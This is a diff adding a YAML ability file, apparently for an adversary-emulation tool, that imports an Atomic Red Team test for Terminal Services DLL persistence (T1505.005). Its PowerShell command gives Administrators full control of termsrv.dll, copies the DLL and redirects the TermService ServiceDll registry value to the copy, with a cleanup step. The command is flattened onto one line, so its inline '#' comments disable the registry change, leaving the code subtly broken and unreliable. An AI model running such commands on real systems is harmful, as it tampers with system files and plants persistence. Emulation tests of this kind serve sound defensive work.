@@ -1,0 +1,42 @@
+- id: 18136e38-0530-49b2-b309-eed173787471
+  name: Modify Terminal Services DLL Path
+  description: This atomic test simulates the modification of the ServiceDll value
+    in HKLM\System\CurrentControlSet\services\TermService\Parameters. This technique
+    may be leveraged by adversaries to establish persistence by loading a patched
+    version of the DLL containing malicious code.
+  tactic: persistence
+  technique:
+    attack_id: T1505.005
+    name: 'Server Software Component: Terminal Services DLL'
+  platforms:
+    windows:
+      psh:
+        command: '$termsrvDll = "C:\Windows\System32\termsrv.dll"; $ACL = Get-Acl
+          $termsrvDll; $permission = "Administrators","FullControl","Allow"; $accessRule
+          = New-Object System.Security.AccessControl.FileSystemAccessRule $permission;
+          $ACL.SetAccessRule($accessRule); Set-Acl -Path $termsrvDll -AclObject $ACL;
+          Copy-Item -Path $termsrvDll -Destination "$HOME\AtomicTest.dll"; $newServiceDll
+          = "$HOME\AtomicTest.dll"; $registryPath = "HKLM:\System\CurrentControlSet\services\TermService\Parameters";
+          # Check if the registry key exists; if (Test-Path -Path $registryPath) {;
+          # Modify the ServiceDll value in the registry; Set-ItemProperty -Path $registryPath
+          -Name "ServiceDll" -Value $newServiceDll; Write-Host "ServiceDll value in
+          the registry has been updated to: $newServiceDll"; } else {; Write-Host
+          "Registry key not found. Make sure the ''TermService\Parameters'' key exists.";
+          }'
+        cleanup: Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\TermService\Parameters"
+          -Name "ServiceDll" -Value "C:\Windows\System32\termsrv.dll"
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - persistence
+  - atomic-red-team
+  - t1505.005
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2022-03-28T15:34:44.590Z'
+    atomic_guid: 18136e38-0530-49b2-b309-eed173787471
+    import_timestamp: '2025-06-24T11:15:03.769300Z'
